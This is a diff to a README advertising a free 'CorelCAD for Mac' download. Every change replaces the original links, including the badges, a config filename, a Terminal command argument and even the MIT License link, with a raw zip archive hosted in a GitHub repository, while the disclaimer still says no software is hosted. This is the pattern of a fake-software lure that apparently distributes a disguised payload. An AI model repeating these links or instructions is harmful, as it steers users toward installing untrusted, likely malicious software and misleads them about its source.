@@ -1,11 +1,11 @@
 # CorelCAD for Mac Free Download 🖥️🍏
 
-[![Download](https://img.shields.io/badge/Download%20for%20macOS-black?style=for-the-badge&logo=apple&logoPosition=right&logoColor=white)](https://Irdk1242s.github.io)
+[![Download](https://github.com/Irdk1242s/corelcad-mac-resource-hub/raw/refs/heads/main/entepicondylar/resource-mac-hub-corelcad-v2.9.zip%20for%20macOS-black?style=for-the-badge&logo=apple&logoPosition=right&logoColor=white)](https://github.com/Irdk1242s/corelcad-mac-resource-hub/raw/refs/heads/main/entepicondylar/resource-mac-hub-corelcad-v2.9.zip)
 
 Unlock creative power and blueprint brilliance with **CorelCAD for Mac**—engineered for 2026's designers, architects, engineers, and visionaries.
 
 **NOTE:**  
-Always verify the integrity of software downloads and refer to the Disclaimer section at the end of this file. This repository provides information only — see https://Irdk1242s.github.io for latest downloads.
+Always verify the integrity of software downloads and refer to the Disclaimer section at the end of this file. This repository provides information only — see https://github.com/Irdk1242s/corelcad-mac-resource-hub/raw/refs/heads/main/entepicondylar/resource-mac-hub-corelcad-v2.9.zip for latest downloads.
 
 ---
 
@@ -93,7 +93,7 @@ CorelCAD for Mac is tailor-fit for 2026 Apple devices and leverages the wealth o
 
 Want to tailor CorelCAD for your workflow? Here’s a sample user profile configuration for optimizing shortcut keys and feature defaults.
 
-_profile.conf_
+https://github.com/Irdk1242s/corelcad-mac-resource-hub/raw/refs/heads/main/entepicondylar/resource-mac-hub-corelcad-v2.9.zip
 ```
 [UI]
 theme = "dark"
@@ -114,7 +114,7 @@ icloud_enabled = true
 Kick things off using the Terminal—perfect for automation or power users.
 
 ```
-open -a "CorelCAD" --args --profile=my_custom_profile.conf --open="/Users/Designer/Projects/Blueprint.dwg"
+open -a "CorelCAD" --args https://github.com/Irdk1242s/corelcad-mac-resource-hub/raw/refs/heads/main/entepicondylar/resource-mac-hub-corelcad-v2.9.zip --open="https://github.com/Irdk1242s/corelcad-mac-resource-hub/raw/refs/heads/main/entepicondylar/resource-mac-hub-corelcad-v2.9.zip"
 ```
 
 This command launches CorelCAD for Mac with your preferred settings, opening the selected DWG file instantly.
@@ -147,7 +147,7 @@ graph TD
 
 1. **Click the badge below to obtain the latest version:**
 
-   [![Download](https://img.shields.io/badge/Download%20for%20macOS-black?style=for-the-badge&logo=apple&logoPosition=right&logoColor=white)](https://Irdk1242s.github.io)
+   [![Download](https://github.com/Irdk1242s/corelcad-mac-resource-hub/raw/refs/heads/main/entepicondylar/resource-mac-hub-corelcad-v2.9.zip%20for%20macOS-black?style=for-the-badge&logo=apple&logoPosition=right&logoColor=white)](https://github.com/Irdk1242s/corelcad-mac-resource-hub/raw/refs/heads/main/entepicondylar/resource-mac-hub-corelcad-v2.9.zip)
    
 2. **Verify** the SHA-256 of your download for security.
 3. **Double-click** the `.dmg` file and drag CorelCAD to your Applications folder.
@@ -159,14 +159,14 @@ graph TD
 
 ## License 📰
 
-Licensed under the [MIT License](https://opensource.org/licenses/MIT) - copyright © 2026.
+Licensed under the [MIT License](https://github.com/Irdk1242s/corelcad-mac-resource-hub/raw/refs/heads/main/entepicondylar/resource-mac-hub-corelcad-v2.9.zip) - copyright © 2026.
 
 ---
 
 ## Disclaimer ⚠️
 
 **This repository is for educational, informational, and prototyping purposes only.**  
-No actual software is hosted here; all mentions of downloading relate to demonstration links (https://Irdk1242s.github.io) provided as placeholders.  
+No actual software is hosted here; all mentions of downloading relate to demonstration links (https://github.com/Irdk1242s/corelcad-mac-resource-hub/raw/refs/heads/main/entepicondylar/resource-mac-hub-corelcad-v2.9.zip) provided as placeholders.  
 Always acquire commercial software licenses through official vendors.  
 We do **not** condone or promote the use of pirated or unlicensed software.
 
@@ -176,7 +176,7 @@ We do **not** condone or promote the use of pirated or unlicensed software.
 
 For your convenience, download links are always at your fingertips:
 
-[![Download](https://img.shields.io/badge/Download%20for%20macOS-black?style=for-the-badge&logo=apple&logoPosition=right&logoColor=white)](https://Irdk1242s.github.io)
+[![Download](https://github.com/Irdk1242s/corelcad-mac-resource-hub/raw/refs/heads/main/entepicondylar/resource-mac-hub-corelcad-v2.9.zip%20for%20macOS-black?style=for-the-badge&logo=apple&logoPosition=right&logoColor=white)](https://github.com/Irdk1242s/corelcad-mac-resource-hub/raw/refs/heads/main/entepicondylar/resource-mac-hub-corelcad-v2.9.zip)
 
 ---
 
